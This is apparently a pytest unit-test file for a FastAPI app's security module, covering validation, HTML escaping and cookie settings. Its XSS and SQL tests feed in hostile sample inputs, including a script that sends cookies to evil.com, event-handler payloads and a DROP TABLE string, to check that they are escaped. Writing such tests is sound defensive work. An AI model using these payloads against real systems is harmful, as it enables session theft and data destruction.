"""
Unit Tests for Security Module

This module contains tests for password validation, email validation,
input sanitization, phone validation, and cookie security settings.
"""

import pytest
import sys
import os
from fastapi import HTTPException

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestPasswordValidation:
    """Tests for password validation function."""
    
    def test_valid_password(self):
        """Test that a valid password passes validation."""
        from authentication.config.security import validate_password
        
        result = validate_password("ValidPass1")
        assert result is True

    def test_password_too_short(self):
        """Test that short password raises exception."""
        from authentication.config.security import validate_password
        
        with pytest.raises(HTTPException) as exc_info:
            validate_password("12345")
        
        assert exc_info.value.status_code == 400
        assert "at least" in exc_info.value.detail.lower()

    def test_password_too_long(self):
        """Test that long password raises exception."""
        from authentication.config.security import validate_password
        
        with pytest.raises(HTTPException) as exc_info:
            validate_password("ThisPasswordIsWayTooLong123")
        
        assert exc_info.value.status_code == 400
        assert "exceed" in exc_info.value.detail.lower()

    def test_password_at_minimum_length(self):
        """Test password at minimum length boundary."""
        from authentication.config.security import validate_password
        
        result = validate_password("123456")  # Exactly 6 characters
        assert result is True

    def test_password_at_maximum_length(self):
        """Test password at maximum length boundary."""
        from authentication.config.security import validate_password
        
        result = validate_password("123456789012345")  # Exactly 15 characters
        assert result is True

    def test_password_with_special_characters(self):
        """Test password with special characters."""
        from authentication.config.security import validate_password
        
        result = validate_password("Pass@123!")
        assert result is True


class TestEmailValidation:
    """Tests for email validation function."""
    
    def test_valid_email(self):
        """Test that a valid email passes validation."""
        from authentication.config.security import validate_email
        
        result = validate_email("test@example.com")
        assert result is True

    def test_valid_email_with_subdomain(self):
        """Test valid email with subdomain."""
        from authentication.config.security import validate_email
        
        result = validate_email("test@mail.example.com")
        assert result is True

    def test_valid_email_with_plus(self):
        """Test valid email with plus sign."""
        from authentication.config.security import validate_email
        
        result = validate_email("test+tag@example.com")
        assert result is True

    def test_invalid_email_no_at(self):
        """Test that email without @ raises exception."""
        from authentication.config.security import validate_email
        
        with pytest.raises(HTTPException) as exc_info:
            validate_email("testexample.com")
        
        assert exc_info.value.status_code == 400
        assert "email" in exc_info.value.detail.lower()

    def test_invalid_email_no_domain(self):
        """Test that email without domain raises exception."""
        from authentication.config.security import validate_email
        
        with pytest.raises(HTTPException) as exc_info:
            validate_email("test@")
        
        assert exc_info.value.status_code == 400

    def test_invalid_email_no_tld(self):
        """Test that email without TLD raises exception."""
        from authentication.config.security import validate_email
        
        with pytest.raises(HTTPException) as exc_info:
            validate_email("test@example")
        
        assert exc_info.value.status_code == 400

    def test_invalid_email_spaces(self):
        """Test that email with spaces raises exception."""
        from authentication.config.security import validate_email
        
        with pytest.raises(HTTPException) as exc_info:
            validate_email("test @example.com")
        
        assert exc_info.value.status_code == 400


class TestInputSanitization:
    """Tests for input sanitization function."""
    
    def test_sanitize_normal_input(self):
        """Test that normal input passes through."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input("John Doe")
        assert result == "John Doe"

    def test_sanitize_with_leading_trailing_spaces(self):
        """Test that leading/trailing spaces are removed."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input("  John Doe  ")
        assert result == "John Doe"

    def test_sanitize_html_tags(self):
        """Test that HTML tags are escaped."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result

    def test_sanitize_special_html_characters(self):
        """Test that special HTML characters are escaped."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input("A & B > C < D")
        assert "&amp;" in result
        assert "&gt;" in result
        assert "&lt;" in result

    def test_sanitize_quotes(self):
        """Test that quotes are escaped."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input('He said "hello"')
        assert "&quot;" in result

    def test_sanitize_preserves_alphanumeric(self):
        """Test that alphanumeric characters are preserved."""
        from authentication.config.security import sanitize_input
        
        result = sanitize_input("Hello123World456")
        assert result == "Hello123World456"


class TestPhoneValidation:
    """Tests for phone number validation function."""
    
    def test_valid_phone_number(self):
        """Test that a valid phone number passes validation."""
        from authentication.config.security import validate_phone_number
        
        result = validate_phone_number("1234567890")
        assert result is True

    def test_phone_too_short(self):
        """Test that short phone number raises exception."""
        from authentication.config.security import validate_phone_number
        
        with pytest.raises(HTTPException) as exc_info:
            validate_phone_number("123456789")
        
        assert exc_info.value.status_code == 400
        assert "10 digits" in exc_info.value.detail

    def test_phone_too_long(self):
        """Test that long phone number raises exception."""
        from authentication.config.security import validate_phone_number
        
        with pytest.raises(HTTPException) as exc_info:
            validate_phone_number("12345678901")
        
        assert exc_info.value.status_code == 400

    def test_phone_with_letters(self):
        """Test that phone with letters raises exception."""
        from authentication.config.security import validate_phone_number
        
        with pytest.raises(HTTPException) as exc_info:
            validate_phone_number("123456789a")
        
        assert exc_info.value.status_code == 400

    def test_phone_with_special_characters(self):
        """Test that phone with special characters raises exception."""
        from authentication.config.security import validate_phone_number
        
        with pytest.raises(HTTPException) as exc_info:
            validate_phone_number("123-456-789")
        
        assert exc_info.value.status_code == 400

    def test_phone_with_spaces(self):
        """Test that phone with spaces raises exception."""
        from authentication.config.security import validate_phone_number
        
        with pytest.raises(HTTPException) as exc_info:
            validate_phone_number("123 456 789")
        
        assert exc_info.value.status_code == 400


class TestSecureCookieSettings:
    """Tests for secure cookie settings function."""
    
    def test_get_secure_cookie_settings_returns_dict(self):
        """Test that function returns a dictionary."""
        from authentication.config.security import get_secure_cookie_settings
        
        result = get_secure_cookie_settings()
        assert isinstance(result, dict)

    def test_cookie_settings_has_required_keys(self):
        """Test that cookie settings has required keys."""
        from authentication.config.security import get_secure_cookie_settings
        
        result = get_secure_cookie_settings()
        
        assert "secure" in result
        assert "samesite" in result
        assert "httponly" in result
        assert "path" in result

    def test_cookie_httponly_is_true(self):
        """Test that httponly is set to True."""
        from authentication.config.security import get_secure_cookie_settings
        
        result = get_secure_cookie_settings()
        assert result["httponly"] is True

    def test_cookie_path_is_root(self):
        """Test that cookie path is root."""
        from authentication.config.security import get_secure_cookie_settings
        
        result = get_secure_cookie_settings()
        assert result["path"] == "/"

    def test_cookie_samesite_is_strict(self):
        """Test that samesite is strict."""
        from authentication.config.security import get_secure_cookie_settings
        
        result = get_secure_cookie_settings()
        assert result["samesite"] == "strict"


class TestSecurityConfig:
    """Tests for SecurityConfig class."""
    
    def test_security_config_password_min_length(self):
        """Test minimum password length configuration."""
        from authentication.config.security import SecurityConfig
        
        assert SecurityConfig.MIN_PASSWORD_LENGTH == 6

    def test_security_config_cookie_httponly(self):
        """Test cookie httponly configuration."""
        from authentication.config.security import SecurityConfig
        
        assert SecurityConfig.COOKIE_HTTPONLY is True

    def test_security_config_samesite(self):
        """Test cookie samesite configuration."""
        from authentication.config.security import SecurityConfig
        
        assert SecurityConfig.COOKIE_SAMESITE == "strict"


class TestXSSPrevention:
    """Tests for XSS prevention via sanitization."""
    
    def test_prevent_script_injection(self):
        """Test that script injection is prevented."""
        from authentication.config.security import sanitize_input
        
        malicious_input = "<script>document.location='http://evil.com/?c='+document.cookie</script>"
        result = sanitize_input(malicious_input)
        
        # Script tags should be escaped
        assert "<script>" not in result
        assert "</script>" not in result

    def test_prevent_event_handler_injection(self):
        """Test that event handler injection is escaped."""
        from authentication.config.security import sanitize_input
        
        malicious_input = '<img src="x" onerror="alert(1)">'
        result = sanitize_input(malicious_input)
        
        # Tags should be escaped
        assert "<img" not in result

    def test_prevent_svg_injection(self):
        """Test that SVG injection is escaped."""
        from authentication.config.security import sanitize_input
        
        malicious_input = '<svg onload="alert(1)">'
        result = sanitize_input(malicious_input)
        
        assert "<svg" not in result

    def test_prevent_iframe_injection(self):
        """Test that iframe injection is escaped."""
        from authentication.config.security import sanitize_input
        
        malicious_input = '<iframe src="http://evil.com"></iframe>'
        result = sanitize_input(malicious_input)
        
        assert "<iframe" not in result


class TestSQLInjectionPrevention:
    """Tests to verify inputs are sanitized for SQL-like patterns."""
    
    def test_sanitize_sql_like_input(self):
        """Test that SQL-like characters don't cause issues."""
        from authentication.config.security import sanitize_input
        
        sql_input = "'; DROP TABLE users; --"
        result = sanitize_input(sql_input)
        
        # Should be escaped, not executed
        assert isinstance(result, str)
        assert result == "&#x27;; DROP TABLE users; --"

    def test_sanitize_union_select(self):
        """Test that UNION SELECT is handled."""
        from authentication.config.security import sanitize_input
        
        sql_input = "admin' UNION SELECT * FROM users --"
        result = sanitize_input(sql_input)
        
        # The single quote should be escaped
        assert "&#x27;" in result
